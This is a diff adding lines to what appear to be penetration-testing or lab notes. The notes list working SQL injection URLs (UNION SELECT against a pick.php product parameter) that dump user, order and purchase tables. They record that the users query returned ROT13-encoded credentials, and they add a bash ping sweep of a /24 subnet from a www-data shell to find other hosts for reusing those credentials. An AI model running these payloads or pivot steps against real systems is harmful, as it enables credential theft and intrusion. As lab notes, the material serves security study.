@@ -94,3 +94,10 @@ siteusers 	username 	$users
           <URL>/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users
           <URL>/pick.php?product=7 UNION SELECT ordernumber,account,date FROM siteusers.shippingdates
           <URL>/pick.php?product=7 UNION SELECT id,quantity,product FROM siteusers.purchase_history
+
+from <URL>/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.users we get rot13 encrypted creds
+
+- Then I went back to www-data on t1 and ran the for script to see what other boxes I can try these creds on. ( for i in {1..255}; do (ping -c 1 192.168.28.$i | grep "bytes from" &); done )
+- 
+
+
